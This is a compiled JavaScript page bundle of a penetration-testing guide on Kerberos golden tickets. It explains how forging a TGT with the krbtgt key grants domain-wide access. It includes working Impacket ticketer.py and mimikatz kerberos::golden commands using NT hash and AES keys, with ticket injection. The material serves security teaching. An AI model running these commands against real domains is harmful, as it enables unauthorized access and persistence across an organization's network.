import{_ as k,c as o,a5 as l,G as t,w as a,B as n,o as d,j as i,a as s}from"./chunks/framework.B5CpDqM0.js";const p="/assets/GoldenCopy.CZJJiQJN.png",b=JSON.parse('{"title":"Golden tickets","description":"","frontmatter":{"authors":"ShutdownRepo"},"headers":[],"relativePath":"ad/movement/kerberos/forged-tickets/golden.md","filePath":"ad/movement/kerberos/forged-tickets/golden.md","lastUpdated":1724982529000}'),g={name:"ad/movement/kerberos/forged-tickets/golden.md"};function c(F,e,y,E,u,m){const h=n("PluginTabsTab"),r=n("PluginTabs");return d(),o("div",null,[e[2]||(e[2]=l('<h1 id="golden-tickets" tabindex="-1">Golden tickets <a class="header-anchor" href="#golden-tickets" aria-label="Permalink to &quot;Golden tickets&quot;">​</a></h1><h2 id="theory" tabindex="-1">Theory <a class="header-anchor" href="#theory" aria-label="Permalink to &quot;Theory&quot;">​</a></h2><p>The long-term key of the <code>krbtgt</code> account can be used to forge a special TGT (Ticket Granting Ticket) that can later be used with <a href="./../ptt">Pass-the-ticket</a> to access any resource within the AD domain. The <code>krbtgt</code>&#39;s key is used to encrypt the PAC. In a Golden Ticket scenario, an attacker that has knowledge of the <code>krbtgt</code> long-term key, will usually forge a PAC indicating that the user belongs to privileged groups. This PAC will be embedded in a forged TGT. The TGT will be used to request Service Tickets than will then feature the PAC presented in the TGT, hence granting lots of access to the attacker.</p><h2 id="practice" tabindex="-1">Practice <a class="header-anchor" href="#practice" aria-label="Permalink to &quot;Practice&quot;">​</a></h2><div class="important custom-block"><p>When forging tickets, before November 2021 updates, the <code>user-id</code> and <code>groups-ids</code> were useful but the <code>username</code> supplied was mostly useless. As of Nov. 2021 updates, if the <code>username</code> supplied doesn&#39;t exist in Active Directory, the ticket gets rejected. This also applies to Silver Tickets.</p></div><p>In order to craft a golden ticket, testers need to find the <code>krbtgt</code>&#39;s RC4 key (i.e. NT hash) or AES key (128 or 256 bits). In most cases, this can only be achieved with domain admin privileges through a <a href="./../../credentials/dumping/dcsync">DCSync attack</a>. Because of this, golden tickets only allow lateral movement and not privilege escalation.</p><div class="tip custom-block"><p>Microsoft now uses AES 256 bits by default. Using this encryption algorithm (instead of giving the NThash) will be stealthier.</p></div>',7)),t(r,null,{default:a(()=>[t(h,{label:"UNIX-like"},{default:a(()=>e[0]||(e[0]=[i("p",null,[s("There are "),i("a",{href:"https://github.com/SecureAuthCorp/impacket",target:"_blank",rel:"noreferrer"},"Impacket"),s(" scripts for each step of a golden ticket creation : retrieving the "),i("code",null,"krbtgt"),s(", retrieving the domain SID, creating the golden ticket.")],-1),i("div",{class:"language-bash vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"bash"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Find the domain SID")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"lookupsid.py"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -hashes"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'LMhash:NThash'"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'DOMAIN/DomainUser@DomainController'"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," 0")]),s(`
`),i("span",{class:"line"}),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Create the golden ticket (with an RC4 key, i.e. NT hash)")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"ticketer.py"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -nthash"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$krbtgtNThash"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -domain-sid"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$domainSID"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -domain"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "randomuser"')]),s(`
`),i("span",{class:"line"}),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Create the golden ticket (with an AES 128/256bits key)")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"ticketer.py"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -aesKey"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$krbtgtAESkey"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -domain-sid"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$domainSID"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -domain"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "randomuser"')]),s(`
`),i("span",{class:"line"}),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Create the golden ticket (with an RC4 key, i.e. NT hash) with custom user/groups ids")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"ticketer.py"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -nthash"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$krbtgtNThash"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -domain-sid"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$domainSID"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -domain"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -user-id"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$USERID"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -groups"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$GROUPID1"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},","),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$GROUPID2"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},',..."'),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "randomuser"')])])])],-1)])),_:1}),t(h,{label:"Windows"},{default:a(()=>e[1]||(e[1]=[i("p",null,[s("On Windows, "),i("a",{href:"https://github.com/gentilkiwi/mimikatz",target:"_blank",rel:"noreferrer"},"mimikatz"),s(" (C) can be used with "),i("a",{href:"https://tools.thehacker.recipes/mimikatz/modules/kerberos/golden",target:"_blank",rel:"noreferrer"},[i("code",null,"kerberos::golden")]),s(" for this attack.")],-1),i("div",{class:"language-bash vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"bash"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# with an NT hash")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"kerberos::golden"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," /domain:"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN "),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"/sid:"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DomainSID "),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"/rc4:"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$krbtgt_NThash "),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"/user:randomuser"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," /ptt")]),s(`
`),i("span",{class:"line"}),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# with an AES 128 key")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"kerberos::golden"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," /domain:"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN "),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"/sid:"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DomainSID "),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"/aes128:"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$krbtgt_aes128_key "),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"/user:randomuser"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," /ptt")]),s(`
`),i("span",{class:"line"}),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# with an AES 256 key")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"kerberos::golden"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," /domain:"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN "),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"/sid:"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DomainSID "),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"/aes256:"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$krbtgt_aes256_key "),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"/user:randomuser"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," /ptt")])])])],-1),i("p",null,[s("For both mimikatz and Rubeus, the "),i("code",null,"/ptt"),s(" flag is used to automatically "),i("a",{href:"./../ptt#injecting-the-ticket"},"inject the ticket"),s(".")],-1)])),_:1})]),_:1}),e[3]||(e[3]=l('<div class="tip custom-block"><p>For Golden and Silver tickets, it&#39;s important to remember that, by default, <a href="https://github.com/SecureAuthCorp/impacket/blob/a16198c3312d8cfe25b329907b16463ea3143519/examples/ticketer.py#L740-L741" target="_blank" rel="noreferrer">ticketer</a> and <a href="https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos" target="_blank" rel="noreferrer">mimikatz</a> forge tickets containing PACs that say the user belongs to some well-known administrators groups (i.e. group ids 513, 512, 520, 518, 519). There are scenarios where these groups are not enough (special machines where even Domain Admins don&#39;t have local admin rights).</p><p>In these situations, testers can specify all the groups ids when creating the ticket. However, deny ACEs could actually prevent this from working. Encountering a Deny ACE preventing domain admins to log on could be an issue when having all groups ids in the ticket, including the domain admin group id. This solution can also be reall inconvenient in domains that have lots of groups.</p><p>Another solution to this is to look for a specific user with appropriate rights to impersonate and use <a href="https://github.com/Dramelac/GoldenCopy" target="_blank" rel="noreferrer">GoldenCopy</a> to generate a command that allows to forge a ticket with specific values corresponding to the target user (sid, group ids, etc.). The values are gathered from a neo4j database.</p></div><p><img src="'+p+'" alt=""></p><p class="caption">Using GoldenCopy for specific user impersonation</p><h2 id="resources" tabindex="-1">Resources <a class="header-anchor" href="#resources" aria-label="Permalink to &quot;Resources&quot;">​</a></h2><p><a href="https://en.hackndo.com/kerberos-silver-golden-tickets/" target="_blank" rel="noreferrer">https://en.hackndo.com/kerberos-silver-golden-tickets/</a></p><p><a href="https://adsecurity.org/?p=483" target="_blank" rel="noreferrer">https://adsecurity.org/?p=483</a></p>',6))])}const f=k(g,[["render",c]]);export{b as __pageData,f as default};
